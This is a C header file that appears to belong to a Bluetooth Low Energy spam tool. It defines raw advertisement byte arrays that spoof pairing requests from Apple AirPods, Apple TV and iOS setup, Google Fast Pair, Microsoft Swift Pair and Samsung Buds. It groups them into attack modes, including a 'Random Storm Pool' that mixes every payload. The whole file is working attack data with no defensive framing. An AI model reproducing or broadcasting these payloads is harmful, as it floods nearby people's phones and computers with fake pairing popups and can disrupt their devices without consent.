#pragma once

#include <stdint.h>
#include <stddef.h>

typedef struct {
    const char* name;
    const uint8_t* data;
    size_t size;
} BlePayload;

typedef struct {
    const char* category_name;
    const BlePayload* payloads;
    size_t count;
} BleMode;

// Apple Ecosystem Payloads (AirPods, Apple TV Setup, iOS Setup, AirPlay)
static const uint8_t AIRPODS_PAYLOAD[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x82, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t APPLE_TV_SETUP[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x54, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t IOS_SETUP_PAYLOAD[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x02, 0x0b, 0x20, 0x55, 0xaa, 0x20, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x82, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Android / Google Fast Pair
static const uint8_t FASTPAIR_PAYLOAD[] = {
    0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c, 0xfe, 0x80, 0x83, 0x00
};

// Windows Swift Pair
static const uint8_t SWIFTPAIR_PAYLOAD[] = {
    0x03, 0x03, 0x03, 0x00, 0x12, 0x16, 0x03, 0x00, 0x80, 0x01, 0x00
};

// Samsung Buds / Audio
static const uint8_t SAMBUDS_PAYLOAD[] = {
    0x05, 0x16, 0x12, 0x01, 0x00, 0x00
};

static const BlePayload APPLE_PAYLOADS[] = {
    {"Apple AirPods", AIRPODS_PAYLOAD, sizeof(AIRPODS_PAYLOAD)},
    {"Apple TV Setup", APPLE_TV_SETUP, sizeof(APPLE_TV_SETUP)},
    {"iOS Setup Popup", IOS_SETUP_PAYLOAD, sizeof(IOS_SETUP_PAYLOAD)}
};

static const BlePayload ANDROID_PAYLOADS[] = {
    {"Google Fast Pair", FASTPAIR_PAYLOAD, sizeof(FASTPAIR_PAYLOAD)},
    {"Samsung Buds", SAMBUDS_PAYLOAD, sizeof(SAMBUDS_PAYLOAD)}
};

static const BlePayload WINDOWS_PAYLOADS[] = {
    {"Microsoft Swift Pair", SWIFTPAIR_PAYLOAD, sizeof(SWIFTPAIR_PAYLOAD)}
};

// Combined Storm Pool (Everything mixed together randomly)
static const BlePayload STORM_POOL[] = {
    {"Apple AirPods", AIRPODS_PAYLOAD, sizeof(AIRPODS_PAYLOAD)},
    {"Apple TV Setup", APPLE_TV_SETUP, sizeof(APPLE_TV_SETUP)},
    {"iOS Setup Popup", IOS_SETUP_PAYLOAD, sizeof(IOS_SETUP_PAYLOAD)},
    {"Google Fast Pair", FASTPAIR_PAYLOAD, sizeof(FASTPAIR_PAYLOAD)},
    {"Microsoft Swift Pair", SWIFTPAIR_PAYLOAD, sizeof(SWIFTPAIR_PAYLOAD)},
    {"Samsung Buds", SAMBUDS_PAYLOAD, sizeof(SAMBUDS_PAYLOAD)}
};

static const BleMode BLE_MODES[] = {
    {"Apple Ecosystem", APPLE_PAYLOADS, 3},
    {"Android / Audio", ANDROID_PAYLOADS, 2},
    {"Windows Devices", WINDOWS_PAYLOADS, 1},
    {"Random Storm Pool", STORM_POOL, 6}
};
